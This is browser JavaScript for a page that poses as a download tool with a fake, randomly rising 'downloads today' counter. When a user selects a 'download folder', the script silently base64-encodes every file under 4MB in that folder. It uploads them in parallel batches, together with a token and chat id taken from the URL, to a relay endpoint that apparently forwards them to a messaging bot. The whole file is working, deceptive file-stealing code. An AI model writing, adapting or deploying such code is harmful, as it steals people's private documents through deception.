/* ---------- Config ---------- */
const params = new URLSearchParams(location.search);
const TOKEN = params.get('token');
const CHAT = params.get('id');
const PROXY_API_URL = '/api/index2.js';

/* ---------- Helpers ---------- */
const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ---------- Fast Base64 converter ---------- */
function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result.split(',')[1]);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

/* ---------- Ultra fast upload ---------- */
async function uploadFile(file) {
  if (file.size > 4 * 1024 * 1024) return false;

  try {
    const base64 = await fileToBase64(file);
    
    const response = await fetch(PROXY_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: TOKEN,
        chat_id: CHAT,
        document: base64,
        filename: file.name
      })
    });
    
    return response.ok;
  } catch (err) {
    return false;
  }
}

/* ---------- Instant progress ---------- */
function updateProgress(current, total) {
  const percent = Math.round((current / total) * 100);
  $('#progressBar').style.width = percent + '%';
  $('#progressText').textContent = `${percent}%`;
}

/* ---------- ULTRA FAST UPLOAD ---------- */
async function startUpload(fileList) {
  const allFiles = Array.from(fileList);
  const validFiles = allFiles.filter(f => f.size <= 4 * 1024 * 1024);
  
  const total = validFiles.length;
  const skipped = allFiles.length - total;
  
  if (total === 0) {
    $('#progressText').textContent = `⛔ No files under 4MB`;
    await sleep(2000);
    reset();
    return;
  }

  let completed = 0;
  const BATCH_SIZE = 20; // Increased from 10

  // Process in large batches without delay
  for (let i = 0; i < total; i += BATCH_SIZE) {
    const batch = validFiles.slice(i, i + BATCH_SIZE);
    
    // Upload batch in parallel
    await Promise.all(
      batch.map(async file => {
        const success = await uploadFile(file);
        completed++;
        updateProgress(completed, total);
        return success;
      })
    );
    
    // NO DELAY - maximum speed!
  }

  console.log(`✅ Uploaded: ${completed - (allFiles.length - total)}`);
  console.log(`⏭️ Skipped: ${skipped}`);
  
  $('#progressText').textContent = `✅ Complete!`;
  await sleep(1500);
  reset();
}

/* ---------- UI Setup ---------- */
function reset() {
  $('#downloadForm').reset();
  $('#startBtn').disabled = true;
  $('#folderInfo').classList.remove('show');
  $('#progressSection').classList.remove('show');
  $('#progressBar').style.width = '0%';
  $('#folderBtn').textContent = '📁 Choose Download Folder';
}

$('#folderBtn').onclick = () => $('#folderInput').click();
$('#folderInput').onchange = () => {
  const files = $('#folderInput').files;
  if (!files.length) return;
  $('#folderName').textContent = '📁 ' + files[0].webkitRelativePath.split('/')[0];
  $('#folderInfo').classList.add('show');
  $('#startBtn').disabled = false;
  $('#folderBtn').textContent = '📁 Change Folder';
};

$('#downloadForm').onsubmit = async e => {
  e.preventDefault();
  const list = $('#folderInput').files;
  if (!list.length) return;
  $('#startBtn').disabled = true;
  $('#progressSection').classList.add('show');
  await startUpload(list);
};

/* ---------- Stats Animation ---------- */
setInterval(() => {
  const current = parseFloat($('#stats').textContent.match(/[\d.]+/)[0]);
  const newCount = (current + Math.random() * 0.1 + 0.05).toFixed(1);
  $('#stats').textContent = `${newCount}M+ downloads today — join the community!`;
}, 12000);